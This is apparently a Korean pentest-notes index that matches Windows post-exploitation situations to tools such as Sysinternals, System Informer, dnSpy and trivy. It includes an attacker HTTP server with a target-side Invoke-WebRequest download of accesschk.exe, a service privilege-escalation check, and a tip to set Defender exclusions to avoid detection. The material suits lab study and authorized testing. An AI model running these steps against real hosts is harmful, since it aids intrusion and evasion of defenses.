# Windows 분석·진단 도구 모음

- Windows 타깃에서 열거·프로세스 분석·.NET 역분석·컨테이너 이미지 점검에 쓰는 도구들의 개요와 어디에 무엇을 쓰는지를 정리한 인덱스. 상세 사용법은 windows/tools/ 하위 문서가 담당한다.
- 셸을 확보한 Windows 호스트에서 프로세스·서비스 이상 징후를 보거나, 드랍한 실행 파일의 동작을 추적해야 할 때, 컨테이너 이미지의 취약점을 점검할 때.
- 각 도구의 설치·실행 절차는 개별 문서 참고. 이 문서는 "상황 → 도구" 대응표 역할만 한다.

## 도구별 위치와 역할

```text
Sysinternals    Process Explorer·Process Monitor·AccessChk·PsExec 등의
                마이크로소프트 진단 도구 모음
                -> windows/tools/sysinternals.md
                권한 점검(accesschk), 프로세스 트리 확인, 서비스 실행 파일 확인

System Informer (구 Process Hacker)
                프로세스·서비스·핸들·네트워크를 GUI로 보는 오픈소스 모니터
                -> windows/tools/systeminformer.md
                서비스 트리·토큰 확인, 드라이버 콜백 열거

dnSpy           .NET(비관리 C#) 어셈블리 디컴파일·디버깅 도구
                -> windows/tools/dnspy.md
                커스텀 페이로드·도구 내부 로직 확인

trivy           컨테이너 이미지·파일시스템·패키지 취약점 스캐너
                -> windows/tools/trivy.md
                이미지 내 OS 패키지·라이브러리 CVE 매칭
```

## 상황별 도구 선택

```text
프로세스가 어떤 권한으로 도는지      -> Process Explorer (Sysinternals)
서비스 실행 파일·설정 확인          -> sc qc + Sysinternals AccessChk
서비스 ACL에 수정 권한이 있는지     -> accesschk.exe -uwcqv <user> <svc>
핸들·DLL 충돌 추적                  -> Process Monitor (Procmon)
서비스·드라이버 상태를 GUI로        -> System Informer
.NET 프로그램 동작 분석             -> dnSpy
이미지 패키지 CVE 점검              -> trivy image <이미지>
```

## 바이너리 전송과 실행

분석 도구 자체를 타깃에 올릴 때는 공통 전송 절차를 쓴다.

```bash
# 공격자
python3 -m http.server 80
```

```powershell
# 타깃
powershell -c "Invoke-WebRequest -Uri 'http://192.168.45.227/accesschk.exe' -OutFile 'C:\Temp\accesschk.exe'"
```

- 전송 상세는 windows/powershell/invoke_webrequest.md. Sysinternals 도구는 첫 실행에 EULA 동의가 필요하므로 `-accepteula`를 붙인다.

```powershell
# Sysinternals 실행 예
C:\Temp\accesschk.exe /accepteula -uwcqv "NETWORK SERVICE" service_name
C:\Temp\procexp64.exe /accepteula
```

## 도구 조합 예 — 서비스 권한 상승 점검

```powershell
# 1) 서비스 목록과 실행 파일 확인
sc query state= all
sc qc vulnerable_service

# 2) 현재 사용자가 그 서비스에 가진 권한 확인
accesschk.exe /accepteula -uwcqv <사용자> vulnerable_service
# SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS 가 나오면 재설정 가능

# 3) GUI로 서비스·토큰 교차 확인
# System Informer에서 서비스 트리 + 프로세스 토큰 확인
```

## 트러블슈팅

- 도구가 Defender에 잡히면 C:\Temp 제외 폴더 설정을 시도하거나, 도구를 여러 개 나눠 올리는 대신 필요한 것만 전송한다.
- Sysinternals는 인터넷이 되는 Windows에서 `Invoke-WebRequest https://live.sysinternals.com/...` 방식으로도 받을 수 있다.
- System Informer는 서명된 릴리스 바이너리를 쓴다. 개발 빌드는 AV 오탐이 잦다.
- dnSpy로 분석하려는 어셈블리가 난독화돼 있으면 문자열·메서드명이 의미 없을 수 있다. 프로그램 흐름 위주로 읽는다.
- trivy는 타깃이 아니라 Kali·개발 머신에서 이미지·파일시스템을 대상으로 돌리는 용도가 기본이다.
